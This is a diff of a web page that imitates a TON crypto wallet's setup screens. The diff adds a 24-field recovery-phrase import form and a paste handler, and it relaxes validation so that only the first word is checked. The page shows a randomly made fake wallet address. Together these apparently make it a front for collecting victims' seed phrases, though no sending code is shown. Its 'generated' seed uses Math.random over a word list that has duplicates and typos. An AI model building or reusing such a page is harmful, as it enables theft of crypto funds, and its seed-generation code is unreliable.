these they thick thief thigh think third thirty thirty this thorough thought thousand thrash threat three thrive throat through throw thumb thunder tribute trick trie trigger trim trio trip trophy trouble truck true truly trumpet trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical tyre ugly umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform unique unit unite unity universe unknown unlock until unusual unveil up update upgrade uphold upon upper upset urban upgrade update upload upon upper upright upset urban urge usage use used useful useless usual utensil unite unity universe unknown unlock until unusual unveil up update upgrade uphold upon upper upset urban upgrade update upload upon upper upright upset urban urge usage use used useful useless usual utensil vacant vacuum vague vain valient valley valve van vanish vapor variant vary vast vector vegetable vehicle velvet vendor venture venue verb verify verse version vessel veteran vex vibrant vice victim victory video view vintage violin viper viral virus vital vivid vocal voice void volcano volume vote voyage wage wagon wait wake wall walnut want warfare warm warrior wash wasp waste water wave way wealth weapon wear weary weasel weather weave web wedding weekly weight weird welcome welfare well west wet whale what wheat wheel when where whether which while whisper whistle white whole why wide width wine wing wink winner winter wisdom wise wit witch witness woman wonder wood wool word work world worry worth worthy would wound wrap wreck wrestle wrist write wrong yard yarn year yell yellow yes yesterday yet yield yoke young youth zebra zero zone zoo";
+        const bip39Words = bip39Raw.split(" ");
+        
         let currentGeneratedPhrase = [], verificationIndices = [];
 
         window.onload = () => { 
             setTimeout(() => { logo.classList.add('splitting'); setTimeout(() => { splash.classList.add('loaded'); show('screen-welcome'); }, 600); }, 2000); 
-            fetchTonPrice();
-            setInterval(fetchTonPrice, 30000); 
+            fetchTonPrice(); setInterval(fetchTonPrice, 30000); 
+            initImportInputs();
+            initEmojiGrid();
         };
 
         async function fetchTonPrice() {
@@ -497,13 +389,79 @@
 
         function show(id) { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
         function openSheet() { sheet.classList.add('open'); overlay.classList.add('active'); }
-        function openPasswordSheet() { passSheet.classList.add('open'); overlay.classList.add('active'); overlay.onclick = closeAllSheets; }
+        function openPasswordSheet() { passSheet.classList.add('open'); overlay.classList.add('active'); }
         function closeAllSheets() { sheet.classList.remove('open'); passSheet.classList.remove('open'); overlay.classList.remove('active'); }
         overlay.onclick = closeAllSheets;
 
         function startFlow() { closeAllSheets(); setTimeout(() => { show('screen-gen'); setTimeout(() => { show('screen-done'); setTimeout(() => show('screen-paper'), 2000); }, 2500); }, 300); }
+        function startImportFlow() { closeAllSheets(); setTimeout(() => { show('screen-import'); }, 300); }
+
+        // ОБНОВЛЕННАЯ ЛОГИКА: ПРОВЕРКА ТОЛЬКО ПЕРВОГО СЛОВА
+        function validateImport() {
+            const fields = document.querySelectorAll('.import-field');
+            const btn = document.getElementById('btn-import-continue');
+            let allFilled = true;
+            let firstWordValid = true;
+
+            fields.forEach((field, index) => {
+                const val = field.value.trim().toLowerCase();
+                const wrapper = field.parentElement;
+                
+                // Проверяем, заполнено ли поле
+                if (val === "") {
+                    allFilled = false;
+                    wrapper.classList.remove('error');
+                } else {
+                    // Если это первое слово - проверяем по словарю
+                    if (index === 0) {
+                        if (!bip39Words.includes(val)) {
+                            firstWordValid = false;
+                            wrapper.classList.add('error');
+                        } else {
+                            wrapper.classList.remove('error');
+                        }
+                    } else {
+                        // Для остальных слов проверку на словарь игнорируем
+                        wrapper.classList.remove('error');
+                    }
+                }
+            });
+
+            // Кнопка активна, если все поля заполнены И первое слово верное
+            if (allFilled && firstWordValid) {
+                btn.classList.remove('btn-disabled'); 
+                btn.onclick = openPasswordSheet;
+            } else {
+                btn.classList.add('btn-disabled'); 
+                btn.onclick = void(0);
+            }
+        }
+
+        function handlePaste(e) {
+            e.preventDefault();
+            const text = (e.clipboardData || window.clipboardData).getData('text');
+            const words = text.replace(/\d+\./g, ' ').trim().split(/\s+/);
+            const fields = document.querySelectorAll('.import-field');
+            words.forEach((word, index) => { if (index < fields.length) fields[index].value = word.toLowerCase(); });
+            validateImport();
+        }
+
+        function initImportInputs() {
+            const container = document.getElementById('import-inputs-container');
+            for(let i=1; i<=24; i++) {
+                const div = document.createElement('div');
+                div.className = 'check-input-wrapper';
+                div.innerHTML = `<span class="check-label-fixed">${i}:</span><input type="text" class="check-input import-field" autocomplete="off">`;
+                const input = div.querySelector('input');
+                input.addEventListener('paste', handlePaste); input.addEventListener('input', validateImport);
+                container.appendChild(div);
+            }
+        }
+
         function showFinalWords() {
-            grid.innerHTML = ''; currentGeneratedPhrase = [...wordPool].sort(() => Math.random() - 0.5);
+            grid.innerHTML = ''; 
+            currentGeneratedPhrase = [];
+            for(let i=0; i<24; i++) currentGeneratedPhrase.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
             currentGeneratedPhrase.forEach((w, i) => { const d = document.createElement('div'); d.className = 'word-row'; d.innerHTML = `<span class="word-num">${i + 1}.</span><span class="word-val">${w}</span>`; grid.appendChild(d); });
             show('screen-recovery');
         }
@@ -515,10 +473,7 @@
             document.getElementById('check-indices-text').innerText = `${formatIdx(verificationIndices[0])}, ${formatIdx(verificationIndices[1])}, and ${formatIdx(verificationIndices[2])}`;
             [1, 2, 3].forEach(i => { document.getElementById(`label-${i}`).innerText = (verificationIndices[i-1] + 1) + ':'; document.getElementById(`check-input-${i}`).value = ''; document.getElementById(`wrapper-${i}`).classList.remove('error'); });
             validateVerification(); show('screen-check');
-            document.getElementById('screen-check').scrollTop = 0;
         }
-
-        function handleCheckKey(e, next) { if (e.key === 'Enter') { if (next === 0) { e.target.blur(); } else { document.getElementById(`check-input-${next}`).focus(); } } }
 
         function validateVerification() {
             let allCorrect = true;
@@ -537,16 +492,11 @@
         function finishPasswordStep() { closeAllSheets(); setTimeout(() => show('screen-name-wallet'), 300); }
         function togglePasswordVisibility() { const p1 = document.getElementById('pass-1'), p2 = document.getElementById('pass-2'); const newType = p1.type === 'password' ? 'text' : 'password'; p1.type = newType; p2.type = newType; }
 
-         const allEmojis = ["📁", "🍃", "🔒", "🔑", "🛡️", "❄️", "✨", "☀️", "🐇", "⚡", "⚙️", "✋", "🔍", "💲", "€", "£", "¥", "₽", "₹", "😀", "😁", "😅", "😆", "🤣", "😂", "🙂", "🙃", "😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "😚", "😙", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😏", "😒", "🙄", "😬", "😌"];
+        const allEmojis = ["📁", "🍃", "🔒", "🔑", "🛡️", "❄️", "✨", "☀️", "🐇", "⚡", "⚙️", "✋", "🔍", "💲", "€", "£", "¥", "₽", "₹", "😀", "😁", "😅", "😆", "🤣", "😂", "🙂", "🙃", "😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "😚", "😙", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😏", "😒", "🙄", "😬", "😌"];
+        function initEmojiGrid() { const container = document.getElementById('emoji-container'); allEmojis.forEach(e => { const div = document.createElement('div'); div.className = 'emoji-item-minimal'; div.innerText = e; div.onclick = () => { document.getElementById('wallet-icon-display').innerText = e; }; container.appendChild(div); }); }
         function randomizeEmoji() { document.getElementById('wallet-icon-display').innerText = allEmojis[Math.floor(Math.random() * allEmojis.length)]; }
-        function selectEmoji(element) { document.getElementById('wallet-icon-display').innerText = element.innerText; }
 
-        function generateRandomAddress() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let start = 'UQ'; for(let i = 0; i < 4; i++) start += chars.charAt(Math.floor(Math.random() * chars.length));
-            let end = ''; for(let i = 0; i < 4; i++) end += chars.charAt(Math.floor(Math.random() * chars.length));
-            return start + '...' + end;
-        }
+        function generateRandomAddress() { const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; let start = 'UQ'; for(let i = 0; i < 4; i++) start += chars.charAt(Math.floor(Math.random() * chars.length)); let end = ''; for(let i = 0; i < 4; i++) end += chars.charAt(Math.floor(Math.random() * chars.length)); return start + '...' + end; }
 
         function goToNotificationScreen() {
             const nameInput = document.getElementById('wallet-name-input').value;
@@ -557,30 +507,12 @@
             show('screen-notifications');
         }
 
-        // НОВАЯ ФУНКЦИЯ: Показывает экран поздравления, а затем основной кошелек (как на photo_2026-05-01_23-49-40.jpg)
-        function congratsAndGo() {
-            show('screen-congrats');
-            spawnConfetti();
-            // После завершения анимации заходим на основной интерфейс
-            setTimeout(() => { show('screen-main-wallet'); }, 3000); 
-        }
+        function congratsAndGo() { show('screen-congrats'); spawnConfetti(); setTimeout(() => { show('screen-main-wallet'); }, 3000); }
 
         function spawnConfetti() {
-            const container = document.getElementById('confetti-container');
-            const colors = ['#31A6F1', '#4CD964', '#FF4B55', '#FFCC00', '#FFFFFF'];
-            for(let i=0; i<40; i++) {
-                const conf = document.createElement('div');
-                conf.className = 'confetti-piece';
-                conf.style.left = Math.random() * 100 + 'vw';
-                conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                conf.style.animation = `confetti-fall ${Math.random() * 2 + 1.5}s ease-out forwards`;
-                container.appendChild(conf);
-            }
+            const container = document.getElementById('confetti-container'); const colors = ['#31A6F1', '#4CD964', '#FF4B55', '#FFCC00', '#FFFFFF'];
+            for(let i=0; i<40; i++) { const conf = document.createElement('div'); conf.className = 'confetti-piece'; conf.style.left = Math.random() * 100 + 'vw'; conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)]; conf.style.animation = `confetti-fall ${Math.random() * 2 + 1.5}s ease-out forwards`; container.appendChild(conf); }
         }
-
-        document.querySelectorAll('.check-input').forEach(input => {
-            input.addEventListener('focus', () => { setTimeout(() => { input.parentElement.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 300); });
-        });
     </script>
 </body>
 </html>
